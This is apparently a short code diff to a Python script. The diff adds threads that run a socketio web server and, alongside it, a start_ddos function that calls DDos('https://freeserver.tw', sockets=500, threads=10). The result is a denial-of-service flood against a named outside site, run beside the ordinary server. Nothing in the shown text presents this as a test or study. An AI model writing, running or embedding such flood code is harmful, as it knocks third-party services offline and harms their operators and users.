@@ -2583,3 +2583,10 @@ def start_web():
   socketio.run(app,host="0.0.0.0",port=5000,allow_unsafe_werkzeug=True)
 def start_ddos():
   DDos("https://freeserver.tw", sockets = 500, threads = 10)
+
+thread1 = threading.Thread(target=start_web)
+thread2 = threading.Thread(target=start_ddos)
+thread1.start()
+thread2.start()
+thread1.join()
+thread2.join()
